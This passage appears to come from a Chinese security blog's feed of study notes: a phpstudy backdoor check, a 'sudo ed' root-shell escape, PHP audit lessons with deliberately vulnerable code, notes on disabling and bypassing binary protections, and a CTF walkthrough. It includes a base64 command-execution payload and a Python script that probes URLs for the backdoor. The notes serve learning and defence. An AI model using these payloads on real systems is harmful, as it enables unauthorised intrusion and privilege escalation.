</li><li>base64编码后：ZWNobyAicGhwc3R1ZHlfYmFja2Rvb3IhIjs=</li><li>burpsuite漏洞验证：</li><li><img src="/backdoors/17.png" alt></li><li>Python验证脚本（访问的目录或文件是存在的，不存在的文件就直接显示404）</li><li><img src="/backdoors/18.png" alt></li><li><img src="/backdoors/19.png" alt></li><li>命令执行验证，system(‘whoami’); base64编码 c3lzdGVtKCd3aG9hbWknKTs=</li><li><img src="/backdoors/20.png" alt></li><li><img src="/backdoors/21.png" alt></li></ol><h3 id="0xFE-phpstudy-backdoor"><a href="#0xFE-phpstudy-backdoor" class="headerlink" title="0xFE phpstudy_backdoor"></a>0xFE phpstudy_backdoor</h3><pre><code>#coding:utf-8import requestsimport sysdef exp(url):    headers={&#39;user-agent&#39;:&#39;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:60.0) Gecko/20100101 Firefox/60.0&#39;,&#39;Accept-Encoding&#39;:&#39;gzip,deflate&#39;,&#39;Accept-Charset&#39;:&#39;ZWNobyAicGhwc3R1ZHlfYmFja2Rvb3IhIjs=&#39;,&#39;Accept&#39;:&#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;,&#39;Accept-Language&#39;:&#39;zh-CN,zh;q=0.5&#39;,&#39;Connection&#39;:&#39;close&#39;}    try:        r=requests.get(url,headers=headers)        if &#39;phpstudy_backdoor!&#39; in r.text:            print(&#39;phpstudy_backdoor!:   &#39;+url)        else:            print(&#39;None&#39;)    except:        passif __name__ == &#39;__main__&#39;:    url=sys.argv[1]    exp(url)</code></pre><h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol><li><a href="https://www.cnblogs.com/zlgxzswjy/p/6209571.html" target="_blank" rel="noopener">https://www.cnblogs.com/zlgxzswjy/p/6209571.html</a></li><li><a href="https://paper.seebug.org/1007/" target="_blank" rel="noopener">https://paper.seebug.org/1007/</a></li></ol><h2 id="0x"><a href="#0x" class="headerlink" title="0x"></a>0x</h2><p><a href="https://blog.csdn.net/bylfsj/article/details/102409951" target="_blank" rel="noopener">https://blog.csdn.net/bylfsj/article/details/102409951</a><br><a href="https://xz.aliyun.com/t/4090" target="_blank" rel="noopener">https://xz.aliyun.com/t/4090</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> backdoor </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>提权之Linux sudo-ed</title>
      <link href="/%E6%8F%90%E6%9D%83%E4%B9%8Bsudo-ed/"/>
      <url>/%E6%8F%90%E6%9D%83%E4%B9%8Bsudo-ed/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><ol><li>环境：Ubuntu 14.04 x86</li><li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8Bsudo-ed/1.png" alt></li><li>命令：</li><li>$ sudo ed</li><li>: [输入当前用户的密码]</li><li>!/bin/sh</li><li># id</li><li># whoami #root</li></ol><h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol><li><a href="https://www.hackingarticles.in/linux-for-pentester-ed-privilege-escalation/" target="_blank" rel="noopener">https://www.hackingarticles.in/linux-for-pentester-ed-privilege-escalation/</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP代码审计学习1</title>
      <link href="/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A11/"/>
      <url>/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A11/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前面"><a href="#0x00-前面" class="headerlink" title="0x00 前面"></a>0x00 前面</h2><ol><li>不管怎样，不懂就按着师傅们的思路走，理解了，知识才是自己的，学习一波~</li></ol><h2 id="0x10-函数漏洞"><a href="#0x10-函数漏洞" class="headerlink" title="0x10 函数漏洞"></a>0x10 函数漏洞</h2><h3 id="0x11-in-array-函数缺陷"><a href="#0x11-in-array-函数缺陷" class="headerlink" title="0x11 in_array()函数缺陷"></a>0x11 in_array()函数缺陷</h3><ol><li><img src="/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A11/1.png" alt></li><li><img src="/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A11/2.png" alt></li><li>漏洞原因：这里使用in_array()函数来检测上传文件的文件名，如果文件名前有数字n，则强制转换为数字n，符合范围的则返回true，否则false，（第三个参数为true则强制检查类型是否一致）。</li><li><img src="/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A11/3.png" alt></li><li><strong>实例piwigo2.7.1</strong></li><li>漏洞入口在\picture.php</li><li><img src="/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A11/4.png" alt></li><li>当参数action的值为rate时，就会调用文件include\functions_rate.inc.php中的方法rate_picture()</li><li>漏洞位置在include\functions_rate.inc.php中的方法rate_picture()</li><li><img src="/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A11/5.png" alt></li><li>在111行，插入数据时，直接拼接$rate的。重点是42行的in_array()函数，里面有个$conf[‘rate_items’]，在config_default.inc.php中</li><li><img src="/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A11/6.png" alt></li><li>这里没有把第三个参数设置为true，是弱比较，可以绕过。</li><li><strong>修复建议</strong></li><li>in_array(str,array,true) #设置第三个参数为true</li><li>使用正则来匹配变量</li><li>使用intval()函数来强制转换变量</li><li><img src="/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A11/7.png" alt></li><li><img src="/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A11/8.png" alt></li></ol><h3 id="0x12-filter-var-函数缺陷"><a href="#0x12-filter-var-函数缺陷" class="headerlink" title="0x12 filter_var()函数缺陷"></a>0x12 filter_var()函数缺陷</h3><ol><li><img src="/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A11/9.png" alt></li><li>这是PHP的一个模板引擎Twig，使用模板的escape和filter_var()函数进行过滤。</li><li>这里使用escape过滤link，实际是使用php内置函数htmlspecialchars来实现。</li><li><img src="/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A11/10.png" alt></li><li><img src="/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A11/11.png" alt></li><li><img src="/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A11/12.png" alt></li><li><img src="/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A11/13.png" alt></li><li><strong>修复建议</strong></li><li>过滤关键词，对特殊字符进行HTML实体编码替换。</li><li><img src="/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A11/14.png" alt></li></ol><h3 id="0x13-实例化任意对象漏洞"><a href="#0x13-实例化任意对象漏洞" class="headerlink" title="0x13 实例化任意对象漏洞"></a>0x13 实例化任意对象漏洞</h3><ol><li><img src="/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A11/15.png" alt></li><li>存在两漏洞：文件包含漏洞、XXE</li></ol><h2 id="0xFE-代码"><a href="#0xFE-代码" class="headerlink" title="0xFE 代码"></a>0xFE 代码</h2><p><strong>Wish List</strong></p><pre><code>class Challenge {  const UPLOAD_DIRECTORY = &#39;./solutions/&#39;;  private $file;  private $whitelist;  public function __construct($file) {    $this-&gt;file = $file;    $this-&gt;whitelist = range(1, 24);  }  public function __destruct() {    if (in_array($this-&gt;file[&#39;name&#39;], $this-&gt;whitelist)) {      move_uploaded_file(        $this-&gt;file[&#39;tmp_name&#39;],        self::UPLOAD_DIRECTORY . $this-&gt;file[&#39;name&#39;]      );    }  }}$challenge = new Challenge($_FILES[&#39;solution&#39;]);</code></pre><p><strong>Twig</strong></p><pre><code>// composer require &quot;twig/twig&quot;require &#39;vendor/autoload.php&#39;;class Template {  private $twig;  public function __construct() {    $indexTemplate = &#39;&lt;img &#39; .      &#39;src=&quot;https://loremflickr.com/320/240&quot;&gt;&#39; .      &#39;&lt;a href=&quot;{{link|escape}}&quot;&gt;Next slide &amp;raquo;&lt;/a&gt;&#39;;    // Default twig setup, simulate loading    // index.html file from disk    $loader = new Twig\Loader\ArrayLoader([      &#39;index.html&#39; =&gt; $indexTemplate    ]);    $this-&gt;twig = new Twig\Environment($loader);  }  public function getNexSlideUrl() {    $nextSlide = $_GET[&#39;nextSlide&#39;];    return filter_var($nextSlide, FILTER_VALIDATE_URL);  }  public function render() {    echo $this-&gt;twig-&gt;render(      &#39;index.html&#39;,      [&#39;link&#39; =&gt; $this-&gt;getNexSlideUrl()]    );  }}(new Template())-&gt;render();</code></pre><p><strong>Snow Flake</strong></p><pre><code>function __autoload($className) {  include $className;}$controllerName = $_GET[&#39;c&#39;];$data = $_GET[&#39;d&#39;];if (class_exists($controllerName)) {  $controller = new $controllerName($data[&#39;t&#39;], $data[&#39;v&#39;]);  $controller-&gt;render();} else {  echo &#39;There is no page with this name&#39;;}class HomeController {  private $template;  private $variables;  public function __construct($template, $variables) {    $this-&gt;template = $template;    $this-&gt;variables = $variables;  }  public function render() {    if ($this-&gt;variables[&#39;new&#39;]) {      echo &#39;controller rendering new response&#39;;    } else {      echo &#39;controller rendering old response&#39;;    }  }}</code></pre><h2 id="0xFF-参考链接"><a href="#0xFF-参考链接" class="headerlink" title="0xFF 参考链接"></a>0xFF 参考链接</h2><ol><li><a href="https://github.com/hongriSec/PHP-Audit-Labs" target="_blank" rel="noopener">https://github.com/hongriSec/PHP-Audit-Labs</a></li><li><a href="https://www.ripstech.com/php-security-calendar-2017/" target="_blank" rel="noopener">https://www.ripstech.com/php-security-calendar-2017/</a></li><li><a href="https://www.php.net/manual/zh/" target="_blank" rel="noopener">PHP手册</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>正则表达式</title>
      <link href="/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
      <url>/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-基础"><a href="#0x00-基础" class="headerlink" title="0x00 基础"></a>0x00 基础</h2><ol><li>\ #标志特殊字符为原义字符，或下一字符为特殊字符，或进制字符</li><li>^ #字符串开始</li><li>$ #字符串结束</li><li>* #对前面的正则式匹配0次或多次</li><li>? #对前面的正则式匹配0次或1次</li><li>+ #对前面的正则式匹配1次或多次、</li><li>. #除\n之外的任何单个字符</li><li>\A #只匹配字符串开始</li><li>\b #边界，匹配空字符串</li><li>\B #非单词边界，匹配空字符串</li><li>\d #数字字符</li><li>\D #非数字字符</li><li>\f #换页符</li><li>\n #换行符</li><li>\r #回车符</li><li>\s #任何空白字符</li><li>\S #任何非空白字符</li><li>\t #制表符</li><li>\v #垂直制表符</li><li>\w #任何单词字符，等价于[A-Za-z0-9_]</li><li>\W #任何非单词字符，等价于[^A-Za-z0-9_]</li><li>/regepx/i  #i 忽略大小写</li><li>a|b #匹配a或b</li><li>(a|b)c #匹配ac或bc</li><li>{m} #a{6}，匹配6个a</li><li>{m,n} #a{3,5}，匹配3到5个a</li><li>{m,n}? #a{3,5}，只匹配3个a</li><li>[] #集合，[asd]匹配a、s、d，[a-z]匹配a至z</li><li>(…) #匹配()内任意正则表达式</li></ol><h2 id="0x01-常用"><a href="#0x01-常用" class="headerlink" title="0x01 常用"></a>0x01 常用</h2><ol><li>/^{A-Za-z0-9_}{3,16}$/ #3至16位由A-Za-z0-9_组成</li></ol><h2 id="0x02-Python正则"><a href="#0x02-Python正则" class="headerlink" title="0x02 Python正则"></a>0x02 Python正则</h2><ol><li><p>import re #正则模块</p></li><li><p><strong>re.match()</strong> #从字符串开始位置开始匹配，有就有，无就None</p></li><li><p>re.match(匹配的正则表达式，匹配的字符串，标志位) </p></li><li><p>re.match(‘aa’,’aa.bb.cc’).span() #(0,2)</p></li><li><p>re.match(‘cc’,’aa.bb.cc’) #None</p></li><li><p>re.match(‘AA’,’aa.bb.cc’,re.M|re.I) #(0,2)，re.I：忽视大小写，re.M：匹配多行，re.L：特殊字符集，re.S：即.且包含换行，匹配任意字符（.不包含换行）</p></li><li><p><strong>re.search()</strong> #扫描整个字符串，返回第一个成功的匹配，无就None</p></li><li><p>re.search(‘bb’,’aa.bb.cc.bb’).span() #(3,5)</p></li><li><p><strong>re.compile()</strong> #自定义正则</p></li><li><p>reg=re.compile(r’[a-z]+’,re.I)</p></li><li><p>reg.match()</p></li><li><p>reg.search()</p></li><li><p><strong>re.findall()</strong> #匹配字符串的所有子串，返回列表，无则空列表</p></li><li><p><strong>re.finditer()</strong> #匹配字符串的所有子串，迭代器返回</p></li><li><p><strong>re.sub()</strong> #检索与替换</p></li><li><p>re.A</p></li><li><p>re.ASCII #只匹配ASCII，而不是Unicode</p></li><li><p>re.I</p></li><li><p>re.IGNORECASE #忽略大小写</p></li><li><p>re.M</p></li><li><p>re.MULTILINE #匹配多行</p></li><li></li></ol><h2 id="0xFF-链接"><a href="#0xFF-链接" class="headerlink" title="0xFF 链接"></a>0xFF 链接</h2><ol><li><a href="https://tool.oschina.net/uploads/apidocs/jquery/regexp.html" target="_blank" rel="noopener">https://tool.oschina.net/uploads/apidocs/jquery/regexp.html</a></li><li><a href="https://regex101.com/" target="_blank" rel="noopener">https://regex101.com/</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DNS记录</title>
      <link href="/DNS%E8%AE%B0%E5%BD%95/"/>
      <url>/DNS%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-DNS记录"><a href="#0x00-DNS记录" class="headerlink" title="0x00 DNS记录"></a>0x00 DNS记录</h2><ol><li>A：ipv4地址</li><li>AAAA：ipv6地址</li><li>CNAME：域名的别名</li><li>MX：邮件域名的地址</li><li>PTR：IP反查域名</li><li>SRV：服务的ip地址记录，包含ip/port/priority/weight</li><li>TXT：域名的文本记录，记录联系方式、服务版本信息等</li><li>NS：名称服务器记录，DNS区域，指定哪个域名服务器可以解析该域名的子域名</li><li>SOA：授权机构记录，记录NS中哪个是主服务器</li></ol><h2 id="0x10-dig"><a href="#0x10-dig" class="headerlink" title="0x10 dig"></a>0x10 dig</h2><ol><li><img src="/DNS%E8%AE%B0%E5%BD%95/3.png" alt></li><li>1：dig命令的版本与输入的参数</li><li>2：显示服务返回的一些技术详情，重点在status，值为NOERROR，说明本次查询成功。</li><li>3：显示本次查询的域名</li><li>4：查询到的结果</li><li>5：本次查询的一些统计信息：多长时间，查询了哪些DNS服务器，在何时查询的</li><li>dig domain a</li><li><img src="/DNS%E8%AE%B0%E5%BD%95/1.png" alt></li><li>dig domain mx</li><li><img src="/DNS%E8%AE%B0%E5%BD%95/2.png" alt></li><li>dig domain +trace #+trace，dig会根据查询一直追踪直到查询到最终结果。</li><li><img src="/DNS%E8%AE%B0%E5%BD%95/4.png" alt></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN之程序常用的保护机制</title>
      <link href="/PWN%E4%B9%8B%E7%A8%8B%E5%BA%8F%E5%B8%B8%E7%94%A8%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"/>
      <url>/PWN%E4%B9%8B%E7%A8%8B%E5%BA%8F%E5%B8%B8%E7%94%A8%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p><img src="/PWN%E4%B9%8B%E7%A8%8B%E5%BA%8F%E5%B8%B8%E7%94%A8%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/1.jfif" alt></p><h2 id="0x10-程序常用的保护机制"><a href="#0x10-程序常用的保护机制" class="headerlink" title="0x10 程序常用的保护机制"></a>0x10 程序常用的保护机制</h2><ol><li>数据执行保护，windows称为DEP（Data execution protection），Linux称为NX（No execute，不可执行）:栈不可执行。</li><li>地址随机化，ASLR（windows），PIE（Linux）</li></ol><h2 id="0x11-windows安全机制"><a href="#0x11-windows安全机制" class="headerlink" title="0x11 windows安全机制"></a>0x11 windows安全机制</h2><ol><li>GS编译技术</li><li>SEH的安全校验机制</li><li>Heap Cookie，Safe Unlinking等一序列堆安全机制</li><li>DEP数据执行保护</li><li>ASLR加载地址随机</li><li>SEHOP SEH的覆盖保护</li></ol><h2 id="0x12-地址随机化：PIE（ASLR，address-space-layout-randomization）"><a href="#0x12-地址随机化：PIE（ASLR，address-space-layout-randomization）" class="headerlink" title="0x12 地址随机化：PIE（ASLR，address space layout randomization）"></a>0x12 地址随机化：PIE（ASLR，address space layout randomization）</h2><ol><li>一般情况下（Linux）NX（Windows平台上称其为DEP）和地址空间分布随机化（ASLR）会同时工作。</li><li>可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。</li><li>内存地址随机化机制（ASLR)，有以下三种情况</li><li>0 - 表示关闭进程地址空间随机化。</li><li>1 - 表示将mmap的基址，stack和vdso页面随机化。</li><li>2 - 表示在1的基础上增加栈（heap）的随机化。</li><li><strong>Linux下关闭PIE的命令：</strong></li><li>sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space</li><li><strong>gcc编译命令：</strong></li><li>gcc -o test test.c // 默认情况下，不开启PIE</li><li>gcc -fpie -pie -o test test.c // 开启PIE，此时强度为1</li><li>gcc -fPIE -pie -o test test.c // 开启PIE，此时为最高强度2</li><li>gcc -fpic -o test test.c // 开启PIC，此时强度为1，不会开启PIE</li><li>gcc -fPIC -o test test.c // 开启PIC，此时为最高强度2，不会开启PIE</li><li><strong>windows下关闭映像随机化</strong></li><li>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\Memory Management\MoveImages（没有就新建）</li><li>-1时，强制随机化</li><li><strong>堆栈随机化</strong></li><li>堆栈的基址是打开程序的时候确定的，同一个程序任意两次运行时的堆栈基址是不同的。</li><li><strong>PEB与TEB随机化</strong></li><li>微软在xp sp2之后不再使用固定的PEB基址0x7FFDF000和TEB基址0x7FFDE00</li><li><strong>绕过</strong></li><li>对于映像随机化，虽然模块的加载地址变了，但低2个字节不变。</li><li>对于ASLR堆栈随机化，可以使用JMP esp和heap spray等绕过限制</li><li>对于PEB和TEB的随机化，也是可以通过FS的偏移来定位的</li><li>利用部分覆盖进行定位内存地址</li><li>利用Heap spray进行内存地址定位</li><li>利用Java applet heap spray定位内存地址</li></ol><h2 id="0x13-CANNARY-栈保护"><a href="#0x13-CANNARY-栈保护" class="headerlink" title="0x13 CANNARY(栈保护)"></a>0x13 CANNARY(栈保护)</h2><ol><li>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。</li><li>编译时可以控制是否开启栈保护以及程度</li><li>gcc -o test test.c // 默认情况下，不开启Canary保护</li><li>gcc -fno-stack-protector -o test test.c //禁用栈保护</li><li>gcc -fstack-protector -o test test.c //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码</li><li>gcc -fstack-protector-all -o test test.c //启用堆栈保护，为所有函数插入保护代码</li></ol><h2 id="0x14-FORTIFY"><a href="#0x14-FORTIFY" class="headerlink" title="0x14 FORTIFY"></a>0x14 FORTIFY</h2><ol><li>用于检查是否存在缓冲区溢出的错误。适用情形是程序采用大量的字符串或者内存操作函数，如memcpy，memset，stpcpy，strcpy，strncpy，strcat，strncat，sprintf，snprintf，vsprintf，vsnprintf，gets以及宽字符的变体。</li><li>gcc -o test test.c // 默认情况下，不会开这个检查</li><li>gcc -D_FORTIFY_SOURCE=1 -o test test.c // 较弱的检查</li><li>gcc -D_FORTIFY_SOURCE=2 -o test test.c // 较强的检查</li></ol><h2 id="0x15-数据执行保护：NX（DEP）"><a href="#0x15-数据执行保护：NX（DEP）" class="headerlink" title="0x15 数据执行保护：NX（DEP）"></a>0x15 数据执行保护：NX（DEP）</h2><ol><li><strong>Linux</strong> NX的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</li><li><strong>gcc编译命令：</strong></li><li>gcc -o test test.c // 默认情况下，开启NX保护</li><li>gcc -z execstack -o test test.c // 禁用NX保护</li><li>gcc -z noexecstack -o test test.c // 开启NX保护</li><li><strong>windows</strong> DEP的主要作用是阻止数据页（默认的堆，栈，内存池页）执行代码。分为软件DEP和硬件DEP，软件DEP即SafeSEH，硬件DEP操作系统通过设置内存页的NX属性标记是否在本页执行指令。</li><li><img src="/PWN%E4%B9%8B%E7%A8%8B%E5%BA%8F%E5%B8%B8%E7%94%A8%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/1.png" alt></li><li><strong>DEP分为4种工作态</strong></li><li>Optin：默认仅保护Windows系统组件</li><li>Optout：为排除列表程序外的所有程序和服务启用DEP</li><li>AlwaysOn：对所有进程启用DEP保护</li><li>AlwaysOff：对所有进程都禁用DEP</li><li>Visual Studio 2008之后默认开启DEP保护，编译的程序会在PE头中设置 IMAGE_DLLCHARACTERISTICS_NX_COMPAT标识，这个标识就在结构体IMAGE_OPTIONAL_HEADER 中DllCharacteristics，如果这个值被设为了0x0100表示采用了DEP保护编译。</li><li><strong>局限性</strong></li><li>并不是所有的CPU都支持DEP。</li><li>由于兼容性，不可能对所有的进程开辟DEP保护，这样会出现异常。对一些第三方插件DLL和ATL7.1或以前的程序版本，不会开启。</li><li>编译器中的/NXCOMPAT选项生成的程序，只会在Windows Vista以上的系统有效，在之前的系统会被忽略。</li><li>系统提供了某些API函数可以来控制DEP状态，早期的一些系统可以调用这些函数。</li><li><strong>绕过</strong></li><li>攻击未启用的DEP程序，并不是只要CPU和操作系统支持DEP，所有程序就安全，对于一些进程来说，只要有某一个模块不支持DEP，就不能开启DEP。</li><li><img src="/PWN%E4%B9%8B%E7%A8%8B%E5%BA%8F%E5%B8%B8%E7%94%A8%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/2.png" alt></li><li>利用Re2Libc挑战DEP，跳转到ZwSetInformationProcess函数将DEP关闭再转入shellcode执行。</li><li><strong>原理：</strong></li><li>一个进程的DEP设置标识保存在KPROCESS结构中的_KEXECUTE_OPTIONS 上，这个标识可以通过API函数ZwQueryInformationProcess 和 ZwSetInformationProcess 进行查询和修改。</li><li>在系统中找出一处关闭进程DEP的调用，微软有一个LdrpCheckNXCompatibility函数，当出现DLL收到SafeDisc保护的时候（函数中体现为al=1的时候），就会调用ZwSetInformationProcess函数进行关闭dep，所以我们可以在调用这个函数前把al的值改掉，就能够关闭dep。</li></ol><h2 id="0x16-RELRO"><a href="#0x16-RELRO" class="headerlink" title="0x16 RELRO"></a>0x16 RELRO</h2><ol><li>在Linux系统安全领域数据可以写的存储区就会是攻击的目标，尤其是存储函数指针的区域。 所以在安全防护的角度来说尽量减少可写的存储区域对安全会有极大的好处.GCC, GNU linker以及Glibc-dynamic linker一起配合实现了一种叫做relro的技术: read only relocation。大概实现就是由linker指定binary的一块经过dynamic linker处理过 relocation之后的区域为只读。</li><li>gcc -o test test.c // 默认情况下，是Partial RELRO</li><li>gcc -z norelro -o test test.c // 关闭，即No RELRO</li><li>gcc -z lazy -o test test.c // 部分开启，即Partial RELRO</li><li>gcc -z now -o test test.c // 全部开启</li></ol><h2 id="0x17-总结"><a href="#0x17-总结" class="headerlink" title="0x17 总结"></a>0x17 总结</h2><ol><li>NX：-z execstack / -z noexecstack (关闭 / 开启)</li><li>Canary：-fno-stack-protector /-fstack-protector / -fstack-protector-all (关闭 / 开启 / 全开启)</li><li>PIE：-no-pie / -pie (关闭 / 开启)</li><li>RELRO：-z norelro / -z lazy / -z now (关闭 / 部分开启 / 完全开启)</li></ol><h2 id="0xFF-参考链接"><a href="#0xFF-参考链接" class="headerlink" title="0xFF 参考链接"></a>0xFF 参考链接</h2><ol><li><a href="https://introspelliam.github.io/2017/09/30/linux程序的常用保护机制/" target="_blank" rel="noopener">上善若水</a></li><li><a href="https://blog.csdn.net/m0_37809075/article/details/83008617" target="_blank" rel="noopener">https://blog.csdn.net/m0_37809075/article/details/83008617</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN学习</title>
      <link href="/PWN%E5%AD%A6%E4%B9%A0/"/>
      <url>/PWN%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-PWN"><a href="#0x00-PWN" class="headerlink" title="0x00 PWN"></a>0x00 PWN</h2><ol><li><img src="/PWN%E5%AD%A6%E4%B9%A0/1.jfif" alt></li><li>“Pwn”是一个黑客语法的俚语词，是指攻破设备或者系统。发音类似”砰”，对黑客而言，这就是成功实施黑客攻击的声音——砰的一声，被”黑”的电脑或手机就被你操纵了。</li></ol><h2 id="0x01-工具"><a href="#0x01-工具" class="headerlink" title="0x01 工具"></a>0x01 工具</h2><ol><li><a href="https://github.com/Gallopsled/pwntools/tree/stable" target="_blank" rel="noopener">pwntools</a>，一个CTF框架和漏洞利用开发库。</li><li><a href="https://pwntools.readthedocs.io/en/stable/" target="_blank" rel="noopener">工具帮助信息</a></li><li><a href="http://brieflyx.me/2015/python-module/pwntools-intro/" target="_blank" rel="noopener">工具基本使用信息</a></li><li><a href="http://brieflyx.me/2015/python-module/pwntools-advanced/" target="_blank" rel="noopener">工具高级使用信息</a></li><li><a href="https://github.com/Gallopsled/pwntools-binutils" target="_blank" rel="noopener">https://github.com/Gallopsled/pwntools-binutils</a></li><li><a href="https://github.com/aquynh/capstone" target="_blank" rel="noopener">反汇编框架</a></li><li></li></ol><h2 id="0x02-查壳"><a href="#0x02-查壳" class="headerlink" title="0x02 查壳"></a>0x02 查壳</h2><ol><li>工具：<a href="https://github.com/slimm609/checksec.sh" target="_blank" rel="noopener">checksec</a></li><li>查壳命令：./checksec –file <file></file></li><li></li></ol><h2 id="0x03-脱壳"><a href="#0x03-脱壳" class="headerlink" title="0x03 脱壳"></a>0x03 脱壳</h2><ol><li>upx壳（例子）</li><li>脱壳命令：upx -d <file></file></li></ol><h2 id="0x10-例子1"><a href="#0x10-例子1" class="headerlink" title="0x10 例子1"></a>0x10 例子1</h2><ol><li><a href="https://adworld.xctf.org.cn/" target="_blank" rel="noopener">XCTF</a>的<a href="/PWN学习/xctf-cgpwn2">xctf-cgpwn2</a></li><li>文件识别与运行</li><li><img src="/PWN%E5%AD%A6%E4%B9%A0/1.png" alt></li><li>查保护机制</li><li><img src="/PWN%E5%AD%A6%E4%B9%A0/2.png" alt></li><li>显示字符串窗口：shift+F12</li><li><img src="/PWN%E5%AD%A6%E4%B9%A0/3.png" alt></li><li>有个system，F5查看伪代码，结果打不开，postive sp value has been found，说明有负的栈指针</li><li><img src="/PWN%E5%AD%A6%E4%B9%A0/4.png" alt></li><li>选项——常规——勾选堆栈指针，多了框住的东西，就是栈指针</li><li><img src="/PWN%E5%AD%A6%E4%B9%A0/5.png" alt></li><li><img src="/PWN%E5%AD%A6%E4%B9%A0/6.png" alt></li><li>找出负的栈指针</li><li><img src="/PWN%E5%AD%A6%E4%B9%A0/7.png" alt></li><li>在负值指针处上一行，alt+k调整跟前面的一样</li><li><img src="/PWN%E5%AD%A6%E4%B9%A0/8.png" alt></li><li>再按F5即可查看伪代码</li><li><img src="/PWN%E5%AD%A6%E4%B9%A0/9.png" alt></li><li>没啥东西，查看hello的伪代码</li><li><img src="/PWN%E5%AD%A6%E4%B9%A0/10.png" alt></li><li>gets()函数，这可能存在溢出漏洞，双击前面name</li><li><img src="/PWN%E5%AD%A6%E4%B9%A0/11.png" alt></li><li></li></ol><p><a href="https://blog.csdn.net/macro_wing/article/details/99469676" target="_blank" rel="noopener">https://blog.csdn.net/macro_wing/article/details/99469676</a><br><a href="https://www.cnblogs.com/beiweisanshidu/p/10256449.html" target="_blank" rel="noopener">https://www.cnblogs.com/beiweisanshidu/p/10256449.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019红帽杯之恶臭的数据包</title>
      <link href="/2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%E4%B9%8B%E6%81%B6%E8%87%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85/"/>
      <url>/2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%E4%B9%8B%E6%81%B6%E8%87%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85/</url>
      
